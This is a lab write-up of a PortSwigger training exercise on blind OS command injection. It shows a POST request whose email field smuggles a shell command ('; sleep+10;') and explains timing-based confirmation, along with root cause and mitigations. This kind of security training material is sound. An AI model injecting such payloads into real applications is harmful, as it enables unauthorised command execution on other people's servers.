# Lab Report: Blind OS Command Injection with Time Delays

## Overview
This report documents the exploitation of a **Blind OS Command Injection** vulnerability identified in the feedback submission functionality of the target web application (PortSwigger Lab).  

The injection does not return command output, but we can confirm execution using **time-based payloads**.

---

## Evidence of Exploitation

## Request
```http
POST /feedback/submit HTTP/2
Host: 0af8006903efd585811707cc003b0054.web-security-academy.net
Cookie: session=48DU1hc4aVIZRuvQ3BoEgk2pszbu2qCt
Content-Type: application/x-www-form-urlencoded
Content-Length: 112

csrf=RSaFY6HpuFOg03gYR5dybcfGA6YOppT&name=Rumana&email=Rumana%40gmail.com; sleep+10;&subject=Nothing&message=Hi

## Response

HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 16

"Could not save"


## Observation

-The server response was delayed by approximately 10 seconds after submission.

-This confirms that the injected command (sleep 10) was executed on the backend system.

-Even though the response returned an error message (Could not save), the timing difference proves successful exploitation.


## Impact

-Attackers can execute arbitrary system commands on the underlying server.

-Even without output, this vulnerability can be leveraged for:

-Exfiltration via DNS/HTTP requests

-Privilege escalation

-Full server compromise

## Root Cause
The application concatenates untrusted user input (the `email` parameter) into a system command without proper sanitization.  

Special shell metacharacters (`;`, `&&`, `|`) are not filtered.

## Mitigation
- **Avoid system calls with user input** – Use safe APIs and parameterized functions.  
- **Input Validation & Sanitization** – Reject dangerous characters and enforce strict input rules (e.g., valid email format).  
- **Least Privilege Execution** – Run the application with minimal system permissions.  
- **Monitoring** – Detect abnormal response delays that may indicate exploitation attempts.

## Skills Demonstrated
- Identification of blind command injection  
- Use of time-based payloads (`sleep 10`)  
- Validation of command execution through response timing analysis  
- Crafting injection payloads in a POST request body

## References
- [PortSwigger Academy: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/blind)  
- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

## Screenshot
![Blind OS Command](/images/Code-Injection-Lab2-backend.jpg)  
![Blind OS Command lab solved](/images/Code-Injection-Lab2.jpg) 
